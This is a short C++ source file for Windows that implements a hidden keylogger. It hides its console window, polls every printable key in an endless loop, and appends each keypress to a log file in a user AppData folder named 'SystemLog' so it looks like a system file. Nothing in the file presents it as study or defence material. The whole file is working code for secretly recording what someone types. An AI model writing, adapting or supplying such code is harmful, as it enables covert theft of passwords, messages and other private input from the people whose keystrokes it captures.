#include <iostream>
#include <windows.h>
#include <fstream>
#include <string>
bool keyWasDown[256]={false};
using namespace std;
void logKey(string key) {
    std::ofstream logFile("C:\\Users\\Hadil\\AppData\\Roaming\\SystemLog\\log.txt", std::ios::app);
    logFile<<key<<endl;
    logFile.close();
}
int main(){
    ShowWindow(GetConsoleWindow(),SW_HIDE);
    while(true){
        
        for (int i = 32; i <= 126; i++) {
            SHORT keyState=GetAsyncKeyState(i);
            bool isCurrentlyDown=(keyState & 0x8000)!=0;
            if (isCurrentlyDown && !keyWasDown[i]){

                string key;

                switch (i) {
                    case 13: key="[ENTER]"; break;
                    case 32: key="[SPACE]"; break;
                    case 9: key="[TAB]"; break;
                    case 8: key="[BACKSPACE]"; break;
                    case 27: key="[ESC]"; break;
                    default:
                        if (i>=32 && i<=126)
                            key=static_cast<char>(i);
                        else
                            key="[UNKNOWN:"+to_string(i)+"]";
                        break;
                }

                logKey("User pressed: "+key);
                keyWasDown[i]=true;
            }
            else if (!isCurrentlyDown){
                keyWasDown[i]=false;
            }
            Sleep(0.1);
        }
    }
    return 0;
}
